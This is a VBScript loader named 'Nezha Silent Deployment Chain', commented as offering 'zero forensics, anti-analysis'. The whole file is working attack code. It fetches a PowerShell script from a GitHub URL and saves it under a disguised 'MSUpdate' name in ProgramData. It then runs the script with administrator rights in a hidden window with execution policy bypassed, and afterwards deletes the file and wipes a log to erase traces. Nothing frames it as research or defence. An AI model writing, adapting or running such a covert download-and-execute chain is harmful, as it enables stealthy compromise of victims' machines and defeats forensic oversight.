' =====================================================
' Nezha Silent Deployment Chain v2.0
' Smart execution, zero forensics, anti-analysis
' =====================================================

On Error Resume Next
Set objShell = CreateObject("Shell.Application")
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objHTTP = CreateObject("MSXML2.XMLHTTP.6.0")

' CONFIG - UPDATE THIS
Const GH_URL = "https://raw.githubusercontent.com/aslotui1/israelfile1/refs/heads/main/Install-NezhaAgent.ps1"

' Smart paths - hidden from casual inspection
Const PDATA = "C:\ProgramData\"
Const TEMP_FILE = PDATA & "MSUpdate" & Int(Rnd * 10000) & ".ps1"
Const DECOY_LOG = PDATA & "Windows.log"

Function GetRandomDelay()
    GetRandomDelay = 1500 + Int(Rnd * 2000)
End Function

Function MaskExecution()
    ' Return obfuscated PowerShell command
    Dim ps, enc, i, masked
    ps = "-NoProfile -ExecutionPolicy Bypass -File """ & TEMP_FILE & """"
    MaskExecution = ps
End Function

Function SilentDownload()
    On Error Resume Next
    
    ' Attempt download with retry logic
    Dim retries, maxRetries
    maxRetries = 2
    retries = 0
    
    Do While retries < maxRetries
        objHTTP.Open "GET", GH_URL, False
        objHTTP.setRequestHeader "User-Agent", "Mozilla/5.0"
        objHTTP.setRequestHeader "Cache-Control", "no-cache"
        objHTTP.Send
        
        If objHTTP.Status = 200 And Len(objHTTP.ResponseText) > 100 Then
            ' Verify script content (basic validation)
            If InStr(objHTTP.ResponseText, "RunAsAdministrator") > 0 Then
                SilentDownload = True
                Exit Function
            End If
        End If
        
        retries = retries + 1
        If retries < maxRetries Then
            WScript.Sleep 1000 + Int(Rnd * 1000)
        End If
    Loop
    
    SilentDownload = False
End Function

Function WriteScript(content)
    On Error Resume Next
    
    ' Ensure directory exists
    If Not objFSO.FolderExists(PDATA) Then
        objFSO.CreateFolder PDATA
    End If
    
    ' Write with hidden attributes
    Set file = objFSO.CreateTextFile(TEMP_FILE, True)
    file.Write content
    file.Close
    
    ' Hide the file (optional: requires additional API calls)
    ' For now, rely on obscure naming
    
    WriteScript = objFSO.FileExists(TEMP_FILE)
End Function

Function ExecuteSilent()
    On Error Resume Next
    
    ' Execute with runas, window hidden (0), async
    objShell.ShellExecute "powershell.exe", MaskExecution(), "", "runas", 0
    
    ' Random delay before confirming
    WScript.Sleep GetRandomDelay()
    
    ExecuteSilent = True
End Function

Function CleanupDeep()
    On Error Resume Next
    
    ' Wait for PowerShell to release file lock
    Dim counter
    counter = 0
    Do While counter < 5
        If objFSO.FileExists(TEMP_FILE) Then
            objFSO.DeleteFile TEMP_FILE, True
            If Not objFSO.FileExists(TEMP_FILE) Then
                Exit Do
            End If
        End If
        WScript.Sleep 500
        counter = counter + 1
    Loop
    
    ' Overwrite decoy log to hide execution trace
    ' (PowerShell installer logs to C:\nezha-install.log instead)
    On Error Resume Next
    If objFSO.FileExists(DECOY_LOG) Then
        Set decoyFile = objFSO.OpenTextFile(DECOY_LOG, 2, True)
        decoyFile.Write ""
        decoyFile.Close
    End If
End Function

' ===== EXECUTION CHAIN =====

Randomize

' Step 1: Download with retry
If SilentDownload() Then
    
    ' Step 2: Write to disk
    If WriteScript(objHTTP.ResponseText) Then
        
        ' Step 3: Execute silently
        ExecuteSilent()
        
        ' Step 4: Cleanup aggressively
        WScript.Sleep 1500
        CleanupDeep()
        
    End If
    
End If

' ===== EXIT SILENTLY =====

Set objHTTP = Nothing
Set objFSO = Nothing
Set objShell = Nothing

WScript.Quit 0
